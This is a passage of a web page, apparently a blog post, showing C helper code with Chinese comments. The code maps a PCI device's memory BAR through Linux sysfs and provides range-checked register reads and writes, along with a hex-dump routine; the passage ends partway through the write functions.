class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span>* desc, <span class="type">void</span>* addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span>* buf64 = (<span class="type">uint64_t</span>*)addr;</span><br><span class="line">    <span class="type">uint8_t</span>* buf8 = (<span class="type">uint8_t</span>*)addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_MEM 0x00000200ULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span>* bar; <span class="comment">// 映射后的虚拟基址</span></span><br><span class="line">    <span class="type">size_t</span> size; <span class="comment">// 资源真实大小（end - start + 1）</span></span><br><span class="line">    <span class="type">size_t</span> map_len; <span class="comment">// 实际 mmap 的长度（按页对齐）</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// 打开的 /sys/.../resourceN</span></span><br><span class="line">    <span class="type">int</span> res_idx; <span class="comment">// 选中的 resource 行号（BAR 号 0..5）</span></span><br><span class="line">    <span class="comment">// 新增：物理信息</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_start; <span class="comment">// 该映射对应的设备物理起始地址（BAR 起点）</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_end; <span class="comment">// 物理结束地址（含端点）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res_flags; <span class="comment">// resource 行里的 flags（可用于判断 WC 等）</span></span><br><span class="line">    <span class="type">bool</span> inited;</span><br><span class="line">&#125; <span class="type">mmio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">mmio_ctx_t</span> g_mmio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：把 BDF 或 /sys/.../resource 解析成两个路径 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_paths</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span>* resource_txt, <span class="type">size_t</span> txt_sz,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span>* dev_dir, <span class="type">size_t</span> dir_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bdf_or_path || !*bdf_or_path)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 直接传了 /sys/.../resource 或 /sys/.../resourceN */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir, dir_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="type">char</span>* slash = <span class="built_in">strrchr</span>(dev_dir, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!slash)</span><br><span class="line">        &#123;</span><br><span class="line">            errno = EINVAL;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *slash = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 如果传进来的是 resourceN，把它回退到目录再去拼 resource</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(resource_txt, <span class="string">&quot;/resource&quot;</span>) &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt) - <span class="number">1</span>] &gt;= <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt) - <span class="number">1</span>] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s/resource&quot;</span>, dev_dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 传的是 BDF */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir, dir_sz, <span class="string">&quot;/sys/bus/pci/devices/%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：解析 resource 文本，找内存型 BAR（或指定 BAR） --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_mem_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* resource_txt, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* start,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* end,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* flags,</span></span><br><span class="line"><span class="params">                         <span class="type">int</span>* picked_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* fp = fopen(resource_txt, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, sel = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> s = <span class="number">0</span>, e = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;s, &amp;e, &amp;f) != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(f &amp; IORESOURCE_MEM) || e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = EINVAL;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (f &amp; IORESOURCE_MEM))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (sel &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ENOENT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (picked_idx) *picked_idx = sel;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 对外：初始化 / 映射 --- */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EALREADY;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> resource_txt[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> dev_dir[PATH_MAX];</span><br><span class="line">    <span class="keyword">if</span> (build_paths(bdf_or_path, resource_txt, <span class="keyword">sizeof</span>(resource_txt),</span><br><span class="line">                    dev_dir, <span class="keyword">sizeof</span>(dev_dir)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_mem_bar(resource_txt, bar_idx, &amp;start, &amp;end, &amp;flags, &amp;res_idx) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> size = (<span class="type">size_t</span>)((end - start) + <span class="number">1ULL</span>);</span><br><span class="line">    <span class="type">size_t</span> pg = (<span class="type">size_t</span>)sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> map_len = (size + pg - <span class="number">1</span>) &amp; ~(pg - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> res_path[PATH_MAX];</span><br><span class="line">    <span class="built_in">snprintf</span>(res_path, <span class="keyword">sizeof</span>(res_path), <span class="string">&quot;%s/resource%d&quot;</span>, dev_dir, res_idx);</span><br><span class="line">    <span class="type">int</span> fd = open(res_path, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对 MMIO，MAP_SHARED 必须；是否加 MAP_POPULATE 对 MMIO 不关键</span></span><br><span class="line">    <span class="type">void</span>* <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> sv = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = sv;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_mmio.bar = (<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)<span class="built_in">map</span>;</span><br><span class="line">    g_mmio.size = size;</span><br><span class="line">    g_mmio.map_len = map_len;</span><br><span class="line">    g_mmio.fd = fd;</span><br><span class="line">    g_mmio.res_idx = res_idx;</span><br><span class="line">    g_mmio.phys_start = (<span class="type">uint64_t</span>)start;</span><br><span class="line">    g_mmio.phys_end = (<span class="type">uint64_t</span>)end;</span><br><span class="line">    g_mmio.res_flags = flags;</span><br><span class="line">    g_mmio.inited = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.bar) munmap((<span class="type">void</span>*)g_mmio.bar, g_mmio.map_len);</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.fd &gt;= <span class="number">0</span>) close(g_mmio.fd);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_mmio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_mmio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（虚拟信息） --- */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* <span class="title function_">mmio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.bar; &#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">mmio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.size; &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_bar_index</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.res_idx; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（物理信息） --- */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_start; &#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_limit</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_end; &#125; <span class="comment">// inclusive</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* off -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_offset_to_phys</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* VA(映射内某指针) -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_virt_to_phys</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited || !p)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uintptr_t</span> base = (<span class="type">uintptr_t</span>)g_mmio.bar;</span><br><span class="line">    <span class="type">uintptr_t</span> addr = (<span class="type">uintptr_t</span>)p;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt; base || addr &gt;= base + g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> off = (<span class="type">size_t</span>)(addr - base);</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：范围检查 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">chk</span><span class="params">(<span class="type">size_t</span> off, <span class="type">size_t</span> width)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off + width &gt; g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 读写 API（按天然宽度访问；PCI 寄存器通常小端） --- */</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">mmio_read8</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint8_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint16_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 